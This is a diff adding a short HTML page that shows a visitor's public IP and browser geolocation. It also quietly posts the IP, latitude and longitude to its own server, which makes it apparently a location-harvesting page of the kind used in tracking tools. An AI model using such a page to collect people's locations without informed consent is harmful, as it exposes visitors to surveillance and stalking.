@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><meta charset="utf-8"><title> -=Geo Information-=</title></head>
+<link rel="stylesheet" href="style.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  
+<body onload="getLocation()">
+<h1> -=Geo Information-= </h1>
+  
+<p id="error"></p>
+  
+<p id="ip"></p>
+<p id="lat"></p>
+<p id="lon"></p>
+
+<script>
+var ret_ip;
+var x = document.getElementById("error");
+
+var q = document.getElementById("ip");
+var y = document.getElementById("lat");
+var z = document.getElementById("lon");
+
+
+
+$(function() {
+    $.getJSON("https://api.ipify.org?format=jsonp&callback=?",
+      function(json) {
+      
+           q.innerHTML = "Your IP:  " + json.ip;
+           ret_ip=json.ip;
+      
+      }
+    );
+  });
+  
+
+var x = document.getElementById("error");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+  
+function showPosition(position) 
+{
+var a=position.coords.latitude;
+var b=position.coords.longitude;
+
+  
+$(document).ready(function()
+{ 
+   
+    y.innerHTML =  "Your Latitude :  " + position.coords.latitude;
+    z.innerHTML =  "Your Longitude:  " + position.coords.longitude;
+       
+    $.post("/", {ip: ret_ip, lat: a, lon: b },);
+ 
+});
+}
+   
+</script>
+<!--<a href="/booking.html">Query</a> -->
+</body>
+</html>
